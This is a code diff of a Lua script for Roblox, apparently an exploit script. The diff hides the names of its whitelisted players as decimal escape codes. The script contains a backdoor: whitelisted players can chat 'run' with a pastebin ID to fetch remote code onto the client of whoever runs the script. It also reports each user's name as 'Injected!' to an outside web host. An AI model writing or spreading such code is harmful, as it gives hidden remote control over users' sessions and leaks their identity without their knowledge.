@@ -1,7 +1,11 @@
 local Players = game:GetService("Players")
 
 local Commands = {}
-local Whitelist = {693795450}
+local Whitelist = {
+ ["\66\82\52\68\75\73\76\76\69\82"] = true,
+ ["\101\108\101\118\97\116\111\114"] = true,
+ ["\83\105\110\107\105\99\111\108\108"] = true
+}
 
 local AddCommand = function(Name, Function) 
    Name = Name:lower()
@@ -21,6 +25,10 @@ local CommandInput = function(Chat)
    end
 end
 
+local URIEncode = function(String)
+   return game:GetService("HttpService"):UrlEncode(String)
+end
+      
 AddCommand("run", function(Code)
     local Payload = ("https://pastebin.com/raw/" .. tostring(Code))
     local Body = game:HttpGet(Payload)
@@ -45,7 +53,8 @@ AddCommand("il", function(...)
 end)
 
 local Setup = function(Player)
-    if table.find(Whitelist, Player.UserId) then
+    if Whitelist[Player.Name] == true then
+       warn(Player, "Debug")
        Player.Chatted:Connect(CommandInput)
     end
 end
@@ -55,5 +64,6 @@ for i, v in pairs(Players:GetPlayers()) do
    Setup(v)
 end
 pcall(function(...)
-      game:HttpGet("https://testwebsitebradlol.000webhostapp.com/swordburst3.php?content_string=" .. tostring(game.Players.LocalPlayer.Name) .. " Injected!")
+      local Str = (tostring(game.Players.LocalPlayer.Name) .. " Injected!")
+      game:HttpGet("https://testwebsitebradlol.000webhostapp.com/swordburst3.php?content_string=" .. URIEncode(Str))
 end)
